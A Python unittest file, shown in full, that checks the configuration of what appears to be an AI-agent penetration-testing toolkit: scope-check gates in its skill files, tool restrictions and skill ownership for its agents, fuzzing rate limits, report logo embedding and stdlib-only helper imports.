            inventory.write_text(json.dumps([{"port": 22, "protocol": "tcp"},
                                             {"port": 53, "protocol": "udp"},
                                             {"port": 8080, "protocol": "tcp"}]))
            result = subprocess.run([sys.executable, "-c", port_script, str(inventory)],
                                    capture_output=True, timeout=5, check=True)
            self.assertEqual(result.stdout, b"22,8080\n")
            inventory.write_text("[]")
            result = subprocess.run([sys.executable, "-c", port_script, str(inventory)],
                                    capture_output=True, timeout=5, check=True)
            self.assertEqual(result.stdout, b"\n")
        for option in ("-t 5", "-rate 10", "-timeout 3", "-maxtime 15", "-noninteractive", "--timeout 35"):
            self.assertIn(option, ffuf)
        self.assertIn("evidence/pilot.json", ffuf)
        self.assertNotIn("fuzz-ran=ok:findings.md", ffuf)
        self.assertIn("coverage-assessed", ffuf)
        self.assertIn('--profile "$PROFILE" --coverage-set "$COVERAGE"', ffuf)

    def test_canonical_skill_ownership_and_locked_workers(self):
        import runpy
        repo = HELPER.parent.parent
        frontmatter = runpy.run_path(str(HELPER.with_name("build-catalog.py")))["_frontmatter"]
        contract = (repo / "AGENTS.md").read_text()
        owners = {}
        for role in ("recon-runner", "vuln-hunter", "reviewer"):
            row = re.search(r"^\| " + role + r" \| ([^|]+) \|$", contract, re.MULTILINE).group(1)
            for skill in row.split(", "):
                self.assertNotIn(skill, owners)
                owners[skill] = role
        self.assertEqual(set(owners), {path.parent.name for path in (repo / ".claude/skills").glob("*/SKILL.md")})
        for skill, owner in owners.items():
            with self.subTest(skill=skill):
                metadata = dict(line.split(":", 1) for line in
                                frontmatter((repo / ".claude/skills" / skill / "SKILL.md").read_text()).splitlines()
                                if re.match(r"^(name|model|effort|context|agent):", line))
                self.assertEqual(metadata["name"].strip(), skill)
                self.assertEqual(metadata["agent"].strip(), owner)
                self.assertEqual(metadata["context"].strip(), "fork")
                self.assertEqual(metadata["model"].strip(), "inherit")
                if owner == "recon-runner":
                    self.assertEqual(metadata["effort"].strip(), "low")
                agent = (repo / ".claude/agents" / (owner + ".md")).read_text()
                self.assertIn("name: " + owner, frontmatter(agent))
                tools = next(line for line in frontmatter(agent).splitlines() if line.startswith("tools:"))
                self.assertNotRegex(tools, r"\b(?:Agent|Skill|Task|agent)\b")
        reviewer = (repo / ".claude/agents/reviewer.md").read_text()
        self.assertNotIn("Bash", frontmatter(reviewer))
        reporter = (repo / ".claude/agents/reporter.md").read_text()
        self.assertNotRegex(frontmatter(reporter), r"(?:,|:)\s*Bash\s*(?:,|$)")
        self.assertIn("Fail closed", reporter)

    def test_reporter_uses_renamed_png_logo(self):
        repo = HELPER.parent.parent
        logo = repo / "assets/otus-logo.png"
        self.assertTrue(logo.is_file())
        self.assertFalse((repo / "assets/otis-logo.png").exists())
        self.assertEqual(logo.read_bytes()[:8], b"\x89PNG\r\n\x1a\n")
        self.assertLessEqual(logo.stat().st_size, 262144)
        reporter = (repo / ".claude/agents/reporter.md").read_text()
        self.assertNotIn("otis-logo", reporter)
        self.assertIn('ASSET="$ROOT/assets/otus-logo.png"', reporter)
        self.assertIn("PNG limit 256 KiB (262144 bytes)", reporter)
        self.assertIn("src=\"data:image/png;base64,", reporter)
        self.assertNotIn("inlineable ≤150KB asset", reporter)
        script = re.search(r"```\n(\s*ASSET=.*?)```", reporter, re.DOTALL).group(1)
        with tempfile.TemporaryDirectory() as temporary:
            directory = pathlib.Path(temporary)
            (directory / "_report_head.html").write_text('<html><img src="data:image/png;base64,')
            (directory / "_report_tail.html").write_text('"/></html>')
            result = subprocess.run(["bash", "-o", "pipefail", "-c", script],
                                    env={**os.environ, "ROOT": str(repo), "OTUS_RUN": temporary},
                                    stdin=subprocess.DEVNULL, capture_output=True, timeout=10)
            self.assertEqual(result.returncode, 0, result.stderr.decode())
            html = ElementTree.parse(directory / "engagement-report.html")
            source = html.find("img").attrib["src"]
            self.assertTrue(source.startswith("data:image/png;base64,"))
            self.assertEqual(base64.b64decode(source.partition(",")[2]), logo.read_bytes())

    def test_all_skills_use_helper_and_versioned_scope(self):
        skills = list((HELPER.parent.parent / ".claude/skills").glob("*/SKILL.md"))
        self.assertEqual(len(skills), 26)
        for path in skills:
            with self.subTest(skill=path.parent.name):
                text = path.read_text()
                if path.parent.name == "review":
                    self.assertIn("Write ONLY assigned", text)
                    self.assertNotIn("scripts/otus-log.py", text)
                else:
                    for subcommand in ("init --engagement", "scope-check --engagement", "run --run-dir", "finish --run-dir"):
                        self.assertIn(subcommand, text)
                    self.assertIn("notes/task.md", text)
                    self.assertIn("--profile", text)
                    self.assertRegex(text, r"run --run-dir [^`\n]+ --timeout \d+")
                self.assertIn("background: false", text)
                self.assertIn("evidence: ../../scope.json", text)
                self.assertIn("## Checklist", text)
                self.assertLessEqual(len(text.splitlines()), 75)
                self.assertNotRegex(text, r"(?:echo|printf).*\{.*schema")
                self.assertNotRegex(text, r"tee.*\$RUN/run\.log")
                self.assertNotIn("scope.txt", text)
                self.assertNotIn("review.md", text)

    def test_scope_modes_and_locked_agent_writers(self):
        repo = HELPER.parent.parent
        for skill in ("binwalk", "ghidra", "steghide", "wireshark", "hashcat"):
            text = (repo / ".claude/skills" / skill / "SKILL.md").read_text()
            gates = re.findall(r"scripts/otus-log\.py scope-check[^`]+", text)
            self.assertTrue(gates)
            self.assertTrue(all("--target" not in gate for gate in gates), skill)
        pwn = (repo / ".claude/skills/pwntools/SKILL.md").read_text()
        self.assertIn('scope-check --engagement "$ENGAGEMENT" --target "$HOST"', pwn)
        for name in ("reviewer", "reporter"):
            text = (repo / ".claude/agents" / (name + ".md")).read_text()
            tools = next(line for line in text.splitlines() if line.startswith("tools:"))
            self.assertIn("Write", tools)
            self.assertNotIn("python", tools)
            self.assertNotIn("scope.txt", text)
            self.assertNotIn("review.md", text)
            self.assertIn("review.json", text)
            self.assertIn("scope.json", text)
        reporter = (repo / ".claude/agents/reporter.md").read_text()
        self.assertIn("events.jsonl", reporter)
        self.assertIn("inline it **verbatim**", reporter)
        self.assertIn("Save-as-PDF", reporter)
        self.assertNotIn("clock bug", reporter)

    def test_helper_imports_are_stdlib_only(self):
        tree = ast.parse(HELPER.read_text())
        imports = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imports.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                imports.add(node.module.split(".")[0])
        self.assertTrue(imports.issubset(sys.stdlib_module_names))
        self.assertFalse(imports & {"socket", "http", "requests", "httpx"})

    def test_runtime_adapters_match_canonical_generator(self):
        script = HELPER.with_name("build-runtimes.py")
        sources = [HELPER.parent.parent / "CLAUDE.md", HELPER.parent.parent / ".github/copilot-instructions.md"]
        before = [path.read_bytes() for path in sources]
        import runpy
        module = runpy.run_path(str(script))
        contract = (HELPER.parent.parent / "AGENTS.md").read_text()
        for path, appendix in module["TARGETS"].items():
            self.assertEqual(path.read_text(), module["render"](contract, appendix))
        for path, body in module["AGENT_TARGETS"].items():
            generated = module["render_agent"](body)
            self.assertEqual(path.read_text(), generated)
            self.assertTrue(generated.startswith("---\n"))
            self.assertIn("agents: [recon-runner, vuln-hunter, reviewer, reporter]", generated)
            self.assertIn("agent, todo]", generated)
            self.assertLess(generated.index("---\n", 4), generated.index("<!-- GENERATED"))
        self.assertEqual(before, [path.read_bytes() for path in sources])


if __name__ == "__main__":
    unittest.main()